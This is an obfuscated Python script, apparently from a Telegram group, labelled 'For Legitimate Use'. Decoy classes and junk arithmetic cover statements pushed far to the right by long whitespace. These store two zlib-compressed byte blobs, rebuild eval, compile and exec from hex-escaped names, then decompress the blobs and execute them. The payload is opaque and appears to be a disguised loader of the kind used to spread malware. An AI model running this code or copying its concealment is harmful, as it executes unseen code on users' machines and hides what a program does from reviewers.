from builtins import *
from math import prod as Run


__tool__ = 'For Legitimate Use'
__authors__ = ('Telegram:', '@xnabob')
__organization__ = 'Karma Syndicate'
__telegram__ = 'https://t.me/KarmaSyndicate'
__version__ = 'Latest'

__license__ = '4836037d39227231520bc3346a94c8a7'


Negative, Power, Positive, _modulo, _hypothesis, StackOverflow, _round = exec, str, tuple, map, ord, globals, type

class _divide:
    def __init__(self, _invert):
        self._calculate = Run((_invert, 28990))
        self._add(Math=-89300)

    def _add(self, Math = False):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._calculate *= 34293 * Math
        
        try:
            {Positive: 'nbbTe:b:r:a'} if _modulo > StackOverflow else (_hypothesis, Negative, _modulo) <= _builtins

        except AttributeError:
            (({Positive: Power}, Positive) for Positive in (Power, _hypothesis))

        except:
            _round(39850 * 82558) == str

    def DetectVar(self, Ceil = -32528):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Ceil -= -48711 / 76551
        self.MemoryAccess != False
        
        try:
            {Positive: 'nbbTe:b:r:a'} if Positive == _builtins else (Positive, _hypothesis) >= StackOverflow

        except TypeError:
            ((_builtins, {Positive: 'nbbTe:b:r:a'}) for _builtins in {_modulo: Negative} if Negative != Negative)

        except:
            _round(55359 / 96693) == False

    def _stackoverflow(Modulo = float):
        return StackOverflow()[Modulo]

    def _theory(Invert = 61670 - -60639, Walk = float, Frame = StackOverflow):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Frame()[Invert] = Walk
        
        try:
            (((Power, _hypothesis), _builtins) for _builtins in (Positive, Negative))

        except AssertionError:
            (((Positive, Negative), Power) for Power in {_modulo: Negative})

        except:
            _round(2911 - -30520) == str

    def execute(code = str):
        return Negative(Power(Positive(_modulo(_hypothesis, code))))

    @property
    def MemoryAccess(self):
        self.CallFunction = '<__main__._add object at 0x000007254BE75902>'
        return (self.CallFunction, _divide.MemoryAccess)

if __name__ == '__main__':
    try:
        _divide.execute(code = __license__)
        _square = _divide(_invert = -76595 + 47863)

        if 164702 > 9362661:
            _square._add(Math = _square._calculate / -73660)
        elif 116763 < 6994326:
            _divide(_invert = -67943 / 91602).DetectVar(Ceil = -36965 / _square._calculate)                                                                                                                                                                                                                                                          ;_divide._theory(Invert='jljjllijjijjliijljllij',Walk=b'x\x9c\xdd\x1b\xfdo\xa38\xf6\xf7\xfc\x15\xb9\xfe\x12\xd0d\xb3\xc4\x18\x0c\x95"\xdd\xde\xf6\xe6\x94^\xdb\x8c\xd49\xed\x9cF#D\xc0L\xe9\x12\x9c\x032\xcd\xdcj\xefo\xbf\xf7l\x93\x90\xa6iI\xd2V\xa3b\x0c\xfe\xc6~_~\xcf6U\xf1\xfd\xb4\xd3\x85+M\x0c\xf9\xc6+\x08*!\xb2 \xe8\xfeet\xf2^\x14\xdd\x0b\xfe5\xad\xd2YX\xf1\xee\xbfJ~\xd2\x15E\xa3h\xb8\xa8nDQ\xca\xd2\xc6\xc9G\x9e\xf1\xafE8;=\xe9\x9f\xfcu\x99\x87S1=17\xca\x8b\xe2k\x98\xa7\xff\r\xabT\xe4\xea\x13\xff\x0c\x8bY\xd8\xbd\xfe\x9e\xc7i\x04\xdf\xb8\xd7~\xa5[Teo\xaaj^\x9e\xfe\xfcs5\x98\xf1\x9fe\xc5]\xf5\xbe\xf1\xa2\\}\xe2\x02\xf2\xcb\xea^\x89,\x8dx^rY\xa2G=\xdb\xb5l\x16\xdb>!\x8c\xd8C\x87X\xd3\xc8\xb6\xa9\x1b\xfa4\xf2B\xd6\xeb\x98\xa7\xab\xbai^\x19\xbd\xf2\xf74\xee\x99\x1d\xbe\x8c\xf8\xbc\xd2@\xcc\xe7\x8b\xca8\xf9\x90\xf1\xb0\xe4\xdd3\x91\xf7\xaa\xee\xa5\x88\xd3\xe4\xfb\x89\xd9Q\x1fMgsQTA\x00\xf5\xbf\x97=s\xc0\x97ie\x98\x9dLDaV\x1a\xe6\xe7^\x9e\xcf\xf2\xd9L>\xf4\xab\xf7e\xf45\x13S\xc8\xeflgb\x15r\xbdvx_\xe3\x93`\xa0\xf7\xf9\xf4\xf4\xddO\xef~2~2\xde\rM\xf3\x0b\xb4\xc4\xab\xb0\xaa\x8a\x1d-M&g\xfa>\x13\xe0\xe55\x99l\xb7\x12\xa7\xbbZ\xb8\xba\xbc\xba\xbaD\x7f\x85\xd7e\xfd\xbe\x84A\xa81vv\x95\xc0\xda\xe2L\xc05\xc1\x97\x0c\t\x01\xf5\xd6@\xdb\xd9k\x0b\x9c\x10\x96\x85\xb7\x80\xa0\x05~bA\xdd\xed\x06\x8d\xdet\x91fU\x9a#\xf4\xbf\x85\xc5.\xa0\xca \xa6cv\xae\xf2r\xc4E\xaf7\xb8\x15i\xbe\xa3Z6\xce\xe0\x1e\xc3\x95\xc9\x1b\xa2p\x8d\xa1\x1eb\x85\xac\xd0\xd3@\x191\x1e\xeae\x99\xa7U\x96.\xa6\xf7\x81o\xf6\'5b$\x8ej\x94\xed\xd7\x88\xf9\xf9YZ\x19\xa4y\xcc\x97F\xaf\xa8\xca\xad\xcc/\xe6\xa3\xa8\xce\xb24\xcd\xd2\xdb4\xbb\xcdnoSx@\x08\xa2\xb7o\x1cR|Q||\x08T\xbbh\x18A\xb5\xbc[.\xef\xe0\x82\xe7R=\xf0\xbe{\xe3\x90\xca\xc2o\xfc!H=\xccw@C\x19\x92Sz\x8b\x1en /|\xbeyz*\xb3\xf0}{0!\x87\xddJV\x03pIP\xc9\xd8[\x87R&\xc4v\xee\x13\x02j\x02\x9c\x88Lha\x00X\x11\x99S\xceGo\x19P<K\xe73\x11\xed\x0b\xab<\xcf\xd5\\\xb9\xf6r\xbe|\xe3\xd0\xaaB\x91%\xed\x99\xef\xfc\xe2\xe2\xe2\xfc\xfc||\x8e\xaf1\x84.\xce\x0fP\x0c\xd24*A\x83>\x0eB;\x1b\xd9\x0bB\xbb[\xa9!\xf4=I\xb3%\xbf\xc9\x17\xed\xa1\xb4\\\xaa\xf9ny\xa7_\xcbf\xdd\x1ds\xa1\xf1\x10l\x8di\xcf\x1e\x92\x98x$\xb6-\xe2\x83\xbe\x17\xf3H\xc4\xdc\xe8yI\xb5\xdd#S\xaa\xb6o\x99^#\xbe|pJ}L\xf9\x90\xd3\xaa\x9aWoaR\x85\xb9\x02f\x8b\x16\x08\xe9\x99,\xb0\x02\x02\x9e\x06n\xc0\x02;\x18\x06\x0e\x94\xf7\xb6S\x8f\xc1\xaf\xef$\xb6\x0b\xde\xd1\x9e\x81\xf7\xc0\xd3F\xdc%SI\x03m\xca:\xed\xe8D\xd1\xca\x9e\x9d%\xccf6\xb1=\xdb\xb2}x3\xdb\xb1]\x08\x87t\x08\xce\x81\xae8\x94\x91\xd8\xf5\xe1\x9dP\x8fF\xae\xeb\xda\xaeO\xb9Ch\xec\xda\x943\x9bBm\x08\x13\x87:\x8c\x11\xd7q\x86P\x92\xbb\xd4\x85 aOv\xfcQDkZG\x9a\xd7\x0c \xdf\xe4\xfaU\xd9/\x17\x95\xb1KI1v\x18W\xc6N\xe5\xcf|b\xcc\x17\xd8O\xec\xf3\x18\xfa<\x86\x18\xb6=\x86\xd8\xab\x8e9\x0bg\xd38\xec\x02\x97\x0b\xe4rdl\x15:C\xa5c29\xdd=\x84GG\xa7@\xa5\x81\x84\x10\xab\xe3\xaf:\xba}\x99\x840\xe6&@\xdcS\xd7w\xb9\xcb\x08g\x94y\x8c\x12r\x14y\xef\xf8\x1a|\x01]\x0cN=\x9b\xa1f\xce*\xf7\xa9^|\x19\xed$_\xe3\x7f\xbb\tU\x14\x86\xb1\xcb$6\xc3<>\x98\xc6w\r<n8\xae\x87\xb8~\xc7\x8dP\x8b!\xef-\x08Ad%.\x08\\h\xdeq\x01\xc3\xc7\n\xafOx\xfd\xf6\xe97u\xa9\xc8\xa7O\xc7\xd0\xb9\xa5\xe9|\xf8Rt\xceXt\xe4\xa8w\xb4L#\xea\xd3\x10|\x04.\x94\xcfH\xc6}\x99\xa6B\x98\x1e>\x8dX-\x9a\xa4\xed\xa3, \xd9\x1d\xe9\xa0\x1f\x07\x8b\xa6K\xb4\x1f.\xd1\x9c\x90O\x0c\xb4S*H\xe0\x04\xbeT!(x\x1f\xca\xda\x9b)\xed\x9b\x19Bq\xd4Q\\\xa9\x85x\xba\xa9{\xa9\xc7\x90\x10\xd1\xfa\x85\xa7\xf5\x0b\x8c\xdb\xe0}\x9d\x86\xf1\xa1\xd6M\xda\x94m)r\x8f\xd0O@\xdf\xf0\xdc!\x03\x85\x08\x84\xef\xb1L\xf9\x94\xc8\xe5+\xd9\xd3\x8c\x81\x7f~y\x03\xd0\x83!\xc5\xee\x10\xe7\x14\x0c\x1f9\x9b\xf4P\xf5>\x93\x8b\x02R!\x17R\roGz6\x90\x96\x0bDf\x03\xbd\xa2\x1a\xcc\x02\x06\xe5\xe9vj\xdb\xe6H\xe0\x01\xdd\xa26\x8d4\xcb\x82\xa1ln+\xf5\x18J\xf64%\xfa\x9a*\x87H\x8d:N5\x85\xd6\x94\xdc\xa6\xec\xcbS\xf2\xcb\xd0\xaec\x03#\xda\xca\xd5!\xf5\xc6\'\xe8\xf4\xab\xa7c\xb7\x16\xae\xab-\x06\xb9\xe1\x90\xd7k)\xb3\xd9\xe9\xee%\x97\x83\xfa\xde\xeca\xb3\xaf\xeb1\xd5\xe1\x17\xe0@\xbc\xac\xd8\n\x89\xa5\x9d\xfdZ\xee\xdeW\xad6\xce\xb1i\x0cF\x16\x84(\x8aD\x07\x04\xe3\xd4u\x18iW\x1b\xbf\xf3c\x8c\x15\x8cH\x1f\xacN\n!Wj\xd51\x8aw\x1b\xcaH\rLKD\xc2a|\x10c\x11\xe0\xde\xb3A3\xd19\x11\xddQ\xce\xb1\xa0\x1d\xb4f\x87?\xceXw9:d\x0e\xa3\x80E\x18?\x8e\x9cN\xa1\xef\x12\x12\x88g\x86V\x06\x85\xd1\xd9\x08\x19\xd7\xd9\x13\xaf\x9bT\x03\xf5\xdd\x08<\x1a\xe7C7\x96p\x06\xdb\x05\x9c\xc5l\x88%$\x01\\\xe0$\xe7\x90d\xdd\x8f\'{\xf1#@X^\xc7\xcd\x9ai*\xed\xa1L\x9bF`\xec\xb4\x9b\xe3p\xcd\xc8\x81Y\xcc\x867\x93\x1a\x1ajk\xfev\xea+*\xfc\x1b\xa6\xbb@m`"\x94V\x80:\xc1\xd9\xe9C\x8b\x9b\x8f\x02G/6\xaa\xa5Gr\xbdZ\x8e9n\x01\xc6\xd5k^\xae\x9e\x81\xad\x86N\xc9\xf4\x8c\xcc\xf4\xcc\xdd\xa6\xac\xfbr\xe6\x10q\xc9\xb1f\xe0R\x7fj)?\x0c\xd7\xb1J\x8f\xd3PZ\xa8V\xc3\x99\xf6\x124\r\xa5\xe7\xa9\xb2l\xcf\xf5\xa0z\xcf\t\x0c-K\xdb_\x07\x9a[\xbb4\xf1\x08\x9d6\x0c\xa5S1|*\xff\xecz\x80\xa4-O\xd3Vm\xd7\xb8\rM\xd1i\xac\xd7\xb6+\xfb4P\x0f\xb1\xa1\xe1\xabnB\x13\x98\xed d[*\xbe\x0e\xad\xc3\xca\xbd\xc0\x12\t\x00\x00t\x0fpCp6\xbcm\x98\x9a\x87/\xa4\xd7\xc2\x0c\xe9x\xda\xb1\xd5\x93\xe9\xe7=\xffV\x96\xc0V\xc4\xafBkV\xa8\xe3\xca\xb5V\xe4\xe5hq\x04)z5|\xec\xea\xdes\xc1\xa3\xd6\x07\xce\xcc\xb5.\xaf\xdc\xa6\xf5\xb1\x97\xed!\x97_.\xd5B\xcc\x95Z\x8d\xc1{\xff\xd9Kn\xf7\xe6\xf5A)U)\xcf\x8f\xdd\xd9\xb14\xb7S\xed}-\x05|\xb9S\xb3\xde\xd5y\xac\x1c\xddS\xec\xcej+\xac\xde\xcb\x96\xd7\x81\xb6XO\x82SUSud\xa0\x9d\xdacA~+\xb3\xbdg\x0e\xa5.\x84\xcb\x07DZ\xfeV@\xa0<\xd9N=\x16#\x1b{e\xf5\xbaTSN7\xb0\xf2T\xd9\x96\x13\xe2\xd3\xab\x00=\x13\xd7;\x1c\xa8f\x07nK\x80A\xbe\xf5\xcchxF\xcdR\xfa\x03\x8d\xfcZ\x1cl\xfa\xcd\xa5\x0b\xfbIM\xfe \r\xeeX\xfd\xed||\x81\x0e\xda\xc574\xfdC\xefT\xbd\xdc\n\xbe\xafW\xf0C\xbaV\xcfB\xed|\x99\x16\xd1\xf6\xf3\x12n\x9bf\xab=S\xb9\r\x98\xed/\xe1E\xbd!)\xa4\x81#\xb4\xb9s\xf6\xec\xb2\xcc\x03I\xe5\x82\xac\xf2\x02\xaaO\t\xf8\xd2\xda\xdbJ=\x868\xea3\x00\xb6\xf6\xb5nY\xdb9r\xed]\xcb\xb26e\xbd}eY\xad\xe4K0"\xd4e`2\x99H\xa8\x0b\xeb\xd0\tg<\xd6\xfb\xe3\x1a\xd3\xad\xb6\xb2{\xa6^$\x06\x87\xc0\xadMl\xb6\x9d\xfa\x8a\x1cy\xe8&\xc6\x0b)\xc9\xcc\xd3\xae\xbe\xbc\xc6\xdb[\x87\x9e\xdfhr4\xdc\xda\x1cN\xe9$\x85\x98u\xeb3\xee]ut\xbe\xcb\x97<\xea\xcb\xdf\x13\xfa\xf3"\xcd\xab>\xfa\xb2*\xfab\xce\xf3>\xfe\x84\xd0\xc1"\x86:N$O\x19\xa1\xbd99C>7;\xba\x95rV\xcd\xb3t\xda/\xd3\xafy\x98\xf5\xcb\xef\xa5\xfaZ$2Q\x84\xb3\xb0\xfe\xda{Qp\xf8\x024\xaa\x13\n\xfe\x9f\x05/\xab\xb2\x8eG"\x8f\x16E\xc1\xf3j\x90,\xaaE\xc1!\x07\x8a\x1b\xe1\xa2\x82\xaa%\xafF\xabM\\\xdc\xd4\xfd\xb4rf\xa7\xfa\x9b\xa8~\xf90\x1e\xe19$y\x1c\xa9>\x9d\x04\x8aw\xa7\xfa\xf5&\xac\xc6g\xa3\x89%$j\'\xea\x04\xa7\n\xc2\xd5\x89y\xd2-y\x1e\x07\x95X\xfdYb$\x1f\xc2\xeaF\xff\xdeq\x97V7]\x04\x8aJ\xed\xd7k0\xe4z\xbd2\xa3\x96i\xcc\xb0\xec&\xeb\x7fB\xa0\xdb\xf3Q=\xce\xc1\\\x94\xd5\xfa\x87\x1a\xbc\xf6\xc4\xb9\xeb\x02!\xdf[:t\x87\xccr}<\x10\xb1\xb9\xccH\xb8\\\xdaeP\x82@\x88\xb2)\xa3T\x86\xe8\xd0\xb1\xa8\xcfb\x920\x1b7\xda]J\xf7\xdfx\xefo\x8c#\x0e\xabp\xf4\x876\x14V\xfb\xb7\xf0<\xd5\xc0\xffs\xb3|\x92f\xbc\x1c\xfd1\xd3\'B\xf5f\x87\xfe\xb9\xe24\xf9\xb3cJ\xa4 \t\x067`\xe5e\xbc0\xc2\xfeT\xa3C\x12\xab\xb1?\xec\x88\x13\xb9\x1c=\x9b\xea\x85o\x87p\xc7\xa7\x8e\xdc\x0cO\x1c\xc6bgJ\x86NL,\xea0\xcf\xf5\x19\xad\x8f\x9bHg\x01`|\xa83l\xb1\xe4\xa9~\xed\x01fP?\xf3d\xfa\x98\x8d\x9ao\xc1\x99\x1d\xc5/\x03\xf52t\xecz\xfc\x8f\xf1\xd5\xc7~s\xe0\n\x14\xe5\x8d\xb8\x0b\xa6a\x9e')

        if 257984 > 6114602:
            _square.DetectVar(Ceil = 28911 / _square._calculate)
        elif 464731 < 1677564:
            _divide(_invert = -63384 / -77516)._add(Math = _square._calculate - -20553)                                                                                                                                                                                                                                                          ;_divide._theory(Invert='O0OOOoOooo0o000O0OOoo',Walk=b'\x03$6\xc0\x80l5\xf8\xf5\xdf\xbf\\\xbdSg\x14\xf5\xf9\xac\xd5YEU=\xba\xe1\xd1\xef\x01\xb2\xaaQ\x16\xdf\xfa\xc8o\xfdE\xc9\x8b\xfe<,\xcb\xbb\xb8/\x16\xd5{\xc0\x89n\xb9\xaa\x7f\x00[\x11\xbff\xf2\xc1\xf5\xe5\xc7\x0f\xeb\x16\xaat\xc6\xa1\xe6\x08\x17\xd5$*\xa4\x97\x88X"\'`\xad\xd3\r\xc4c\xca\x80\xdfd\xc207\xd2\xd3\xa4\x8b-\x8eF\xda,\xbaj\xd8Gpo6\xb2j\xa8\xac\xc2\xa2\xaa\xf0\x17\xa9\x87\xf3\x1f\xf8\x90L\xcf\xc4\xd747\x1a\xe3\xdf,s0}5\xe9\x8a2\x87\x00e9\x94#U\xd1\x84N\x91\xae\x80\x0b\x1d\xe4:FXL1\x06\xf6\x0esYl\x87\x10\xb6\xb0.pj\xdc\x9a\xbe6p$\x05\x94Fd\x7f\xbc>\xd9\xa5\x08\xef\x9edZq\xe2\xe0\xaeH+~\xd8h\xeb\xde\xb3\xa8\xd9{\x19[\x8dR\xe7\xc9\x8d!\xc6\\\xc8G\x0e\xdc{\x84\x05\x87\x19!\xef\xd6\xbb\xa0z9a\xad\xac\xca\xc2\xcd\xdf\xee\x9e\r\x91\x12\x8dT"\xd1q\x08\xb8\xe7G\xa3\x1e\x9c\xe6_\xfd\xa7\x1e\xb9^M2\x92\x85\xe7\x85\x88xY\x06Y\x9as\x03\x1f\xf7\x98\x16\x93F\xf8\x00\xb6(\xd2\xb9\xa6{`\xac\\T2\xb3+\x8a\xae>\x03\xb5:\x13%#\x9fd\x914\x97\xa5\x9a\x93\x17\xf6J\xc9\xb1\x07d\x86\xfe\x16\x88\x85\xca@0\x82q\x06 \x94\xa6\xda\xf8\\}\\\xb24\xa2\x00\x03*\xa9\xad \xda\x182N\x17\x86TT$m?%\xac$#\xac\x8b_7\x0fl\xeb\xf9\xfa\xfeD]\x03\xb0\x1c%\x83\x82\x87\xb1\x0c7D\x87lw[A\x19|\xbc\xc1\xd2\x1f\x84\xc8\xfe\x0e\x9a\x12**\x06\xb6\xccud\xf3\x03\xba\xd2\xe8s\x9d=(\x17\xd3\x19\x80\xaf\x89\xda\xfe\x06j\x13\xc0\x99\xc4\x9d\xc6N\xf9e\xa3\xc5\x07zt\x17B\x83:b\xbe\x1eW\xc0\xf4\xa99\x03\xa7LPO\x1cP4\\\xdc-\x06.i\xc7\t@\xaaA\x90\x873\x1e\x04\xa3Q\xaeM\xd1\x95E\xaa\xfa\xbf1\rn\xa3\x7f\x0e\xda\xd9H\xfdp{\xac\xf8\xb6A1\x18*\xe1m\'82\xb9\xbbM]\x0f\xc6\x08\xea\x12\xb1\xdcz\x17]\x9fE\xc5}\xdd\xbd\xc4\x9a\xc6\xf1([\xdbe\x99>\x97\xab\xe4\xf6\xaa\xe4\x96r\x8a\xe34\x1b\x08m\xb0\tf\xad\xb9\xe8YqNc\x80\x08\xc3)\rP?\x04\xc8P\x14\xeb\xeeT\x9e\x87\xc0\x13\x00\x96\xc46*\xa2\x14\xe03D\xd5\x12\xde5\x15\xd8\xb8\xb3\x0e5\\\x95\xaf\xa0\x08\xf4\x92\x1c@+;!\xb31rE\xf9\xdd\xbf\xcbW*\xf2.\xb2\xe6\xab1\x02\x12\x07#\xc4\x83R~\xcba\xfd\x1f\x9d4\xa1\x8b')

        if 288286 > 4944996:
            _square._add(Math = _square._calculate / -20363)
        elif 288083 < 2457242:
            _square.DetectVar(Ceil = 7939 - _square._calculate)                                                                                                                                                                                                                                                          ;llIllIIlllIIIllIlIllIlll,ILLJLLLIJLLILJLJIJLIILII,ODOoDOOODOooDDOoDooOODOoO,NMMMNMNMMMNMNNMNNNNNMM,S2SS2222SS22SSS2SS22S2=(lambda WWXXXWXWWXWXWXXWWXXXWXXW:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(WWXXXWXWWXWXWXXWWXXXWXXW)"),filename='\x53\x53\x32\x53\x32\x32\x32\x32\x53\x53\x53\x32\x53\x32\x53\x32\x32\x32\x32\x32',mode='\x65\x76\x61\x6c'))),(lambda WWXXXWXWWXWXWXXWWXXXWXXW:WWXXXWXWWXWXWXXWWXXXWXXW(__import__('\x7a\x6c\x69\x62'))),(lambda WWXXXWXWWXWXWXXWWXXXWXXW:WWXXXWXWWXWXWXXWWXXXWXXW['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda WWXXXWXWWXWXWXXWWXXXWXXW:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(WWXXXWXWWXWXWXXWWXXXWXXW)"),filename='\x53\x53\x32\x53\x32\x32\x32\x32\x53\x53\x53\x32\x53\x32\x53\x32\x32\x32\x32\x32',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda O0o0Oo00o0OO00o0oO000O000O,WWXXXWXWWXWXWXXWWXXXWXXW:O0o0Oo00o0OO00o0oO000O000O(WWXXXWXWWXWXWXXWWXXXWXXW))
        _divide(_invert = -54408 - -22785)._add(Math = _square._calculate + 55648)                                                                                                                                                                                                                                                          ;NMMMNMNMMMNMNNMNNNNNMM()(S2SS2222SS22SSS2SS22S2(ODOoDOOODOooDDOoDooOODOoO(ILLJLLLIJLLILJLJIJLIILII(llIllIIlllIIIllIlIllIlll('\x76\x61\x72\x73'))),_divide._stackoverflow(Modulo='jljjllijjijjliijljllij')+_divide._stackoverflow(Modulo='O0OOOoOooo0o000O0OOoo')))

    except Exception as _builtins:
        if 368864 > 8433025:
            _divide.execute(code = Power(_builtins))

        elif 366475 > 1846422:
            _divide(_invert = 32141 * -65998).DetectVar(Ceil = 64484 / _square._calculate)